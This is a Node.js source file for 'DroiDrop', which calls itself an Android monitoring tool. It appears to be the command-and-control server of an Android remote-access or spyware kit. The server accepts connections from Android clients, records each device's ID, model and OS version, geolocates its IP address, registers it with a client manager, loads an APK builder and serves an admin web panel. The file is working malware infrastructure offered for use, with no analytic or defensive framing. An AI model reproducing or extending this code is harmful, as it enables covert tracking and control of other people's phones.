/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/


const
    express = require('express'),
    app = express(),
    IO = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Create HTTP server and integrate Socket.IO
const http = require('http');
const httpServer = http.createServer(app);

// Attach Socket.IO for client connections to the same HTTP server
// Using a namespace to separate client connections from potential web socket connections
let client_io = IO(httpServer, {
    pingInterval: 30000,
    pingTimeout: 60000,
    path: '/client-socket/',  // Custom path for Android clients
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['polling', 'websocket'],  // Polling first for better compatibility
    allowEIO3: true,  // Allow Engine.IO v3
    allowUpgrades: true,
    perMessageDeflate: false,
    httpCompression: false
});

// Log all connection attempts including failures
client_io.engine.on("connection_error", (err) => {
    console.log('=== CONNECTION ERROR ===');
    console.log('Error:', err);
});

client_io.on('connect_error', (err) => {
    console.log('=== SOCKET.IO CONNECT ERROR ===');
    console.log('Error:', err);
});

client_io.on('connection', (socket) => {
    console.log('\n=== NEW CONNECTION ATTEMPT ===');
    console.log('Time:', new Date().toISOString());
    console.log('Socket ID:', socket.id);
    console.log('Transport:', socket.conn.transport.name);
    console.log('Client IP:', socket.handshake.address);
    console.log('User-Agent:', socket.handshake.headers['user-agent']);
    console.log('Handshake query:', socket.handshake.query);
    console.log('================================\n');
    
    socket.emit('welcome');
    let clientParams = socket.handshake.query;

    // Check if we have the required parameters
    if (!clientParams.id || !clientParams.model) {
        console.log('ERROR: Missing required parameters in handshake');
        console.log('Available params:', Object.keys(clientParams));
        return;
    }

    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    console.log('Client IP:', clientIP);
    console.log('Client ID:', clientParams.id);
    console.log('Client Device:', clientParams.model, clientParams.manf, clientParams.release);

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });
    
    console.log('=== CONNECTION REGISTERED ===');
    console.log('Total online clients:', clientManager.getClientListOnline().length);

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});

/* 
*   
*   
*   t.me/efxtv
*/

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// Get the admin interface online (after routes are configured)
httpServer.listen(CONST.web_port, '0.0.0.0', () => {
    console.log(`Server running on port ${CONST.web_port}`);
    console.log(`Web interface: http://0.0.0.0:${CONST.web_port}`);
    console.log(`Client socket endpoint: http://0.0.0.0:${CONST.web_port}/client-socket/`);
});